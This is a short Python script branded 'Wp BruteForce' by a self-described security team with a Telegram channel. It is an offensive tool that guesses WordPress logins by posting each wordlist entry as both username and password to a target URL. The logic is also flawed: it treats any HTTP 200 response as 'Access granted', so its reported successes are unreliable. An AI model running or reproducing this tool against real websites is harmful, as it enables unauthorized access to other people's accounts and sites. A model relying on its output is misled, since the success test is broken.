# import libraries
import requests
import sys

banner = '''
 \u001b[36m
                   Wp BruteForce
         \u001b[32mDEVELOPED BY TEAM GarudaSecurity \033[0m
  
   Our Official Channel : https://t.me/garudasec4
'''
print(banner)

URL = input('\033[35mYour website: \033[37m')

words = open('wordlist.txt', 'r').readlines()

for w in words:
    word = w.strip()
    
    payload = {'log': word, 'pwd': word}

    with requests.Session() as s:
        p = s.post(URL, data=payload)

    # handle non-OK responses
    if p.status_code == 200:
        print('Access granted:')
        print('Username:', word)
        print('Password:', word)
        sys.exit(0)
    else:
        print('Access denied:')
        print('Username:', word)
        print('Password:', word)
